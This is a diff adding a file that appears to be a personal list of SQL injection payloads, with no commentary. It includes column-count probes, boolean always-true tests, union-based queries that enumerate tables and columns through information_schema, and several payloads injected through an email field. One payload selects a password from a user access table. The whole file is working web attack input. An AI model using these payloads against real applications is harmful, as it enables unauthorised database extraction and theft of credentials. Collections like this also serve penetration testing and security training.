@@ -1,0 +1,20 @@
+10000 order by 1--+-
+1 and 1=2--+-
+1' union select 1,2,3 AND '1
+-1' union select 1, group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
+1 union select 1, group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
+-1% union select 1, group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
+1' order by 11--+-
+1 order by 11--+-
+
+-1' union select 1, group_concat(column_name),3 from information_schema.columns where table_name='users' --+
+' or '1'='1' -- 
+' or '1'='2' -- 
+' UNION select * from products #
+
+jane.smith@email.com"union select 1, group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
+jane.smith@email.com" ' order by 5 --+
+jane.smith@email.com" order by 5 --+
+jane.smith@email.com" or '1'='1' --+
+jane.smith@email.com" union select 1,2,3,4,5,6,7,8,9,10,(select pwd from tbl_user_access limit 0,1)--+-
+@" order by 2--+
